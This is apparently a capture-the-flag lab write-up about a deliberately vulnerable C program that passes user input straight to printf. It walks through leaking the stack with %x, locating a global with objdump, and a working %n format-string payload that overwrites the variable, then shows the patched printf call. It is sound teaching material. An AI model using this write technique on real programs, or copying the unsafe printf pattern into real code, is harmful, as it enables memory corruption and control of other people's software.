Let's take a look at the code...

```
#include <stdio.h>
#include <stdlib.h>

int var0 = 0;

void fun0()
	{
	char buf0[100];
	fgets(buf0, sizeof(buf0), stdin);
	printf(buf0);

	if (var0 == 486)
		{
			printf("What type of a guy would take advantage of a printf? I'll tell you. Level Cleared\n");
		}
	printf("The value of var0 is %d\n", var0);
	}

int main()
{
	fun0();
}
```

So we can see that this challenge is pretty similar to the previous challenge. The only real difference is that the if then statement is checking to see if the value is equal to a specific value. This is something we can deal with towards the end, but first off we have to go throught he same process that we did for the previous challenge.

First we find where our input is stored.

```
root@tux:/Hackery/escape/fmt_str/f2# python -c 'print "0000" + "%x."*20' | ./f2
000064.f77865a0.f0b5ff.ffa5ae4e.1.c2.30303030.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.
The value of var0 is 0
```

So we know that our input is stored 7 stack locations after the printf. Now to find the address of the global int var0.

```
guyinatuxedo@tux:/Hackery/escape/fmt_str/f2$ objdump -t ./f2 | grep var0
0804a048 g     O .bss	00000004              var0
```

Now that we have those two things, we can move onto writing the exploit. Now if we just write write the address to the int, then since the address is only 4 bytes the program will interpret this as the int being 4. Now we can change this by adding additional bytes with the "%x" flag. Since we need to reach 486, we should have to add 482 bytes to reach that.

```
root@tux:/Hackery/escape/fmt_str/f2# python -c 'print "\x48\xa0\x04\x08%482x%7$n"' | ./f2 
H�                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                64
What type of a guy would take advantage of a printf? I'll tell you. Level Cleared
The value of var0 is 486
```

And just like that, we pwned the binar. Now to patch it. 

```
#include <stdio.h>
#include <stdlib.h>

int var0 = 0;

void fun0()
	{
	char buf0[100];
	fgets(buf0, sizeof(buf0), stdin);
	printf("%s\n", buf0);

	if (var0 == 486)
		{
			printf("What type of a guy would take advantage of a printf? I'll tell you. Level Cleared\n");
		}
	printf("The value of var0 is %d\n", var0);
	}

int main()
{
	fun0();
}
```

As you can see, the patch is the same as the last time.

```
root@tux:/Hackery/escape/fmt_str/f2# python -c 'print "0000" + "%x."*20' | ./f2_secure 
0000%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.

The value of var0 is 0
```

And just like that, we patched the binary.
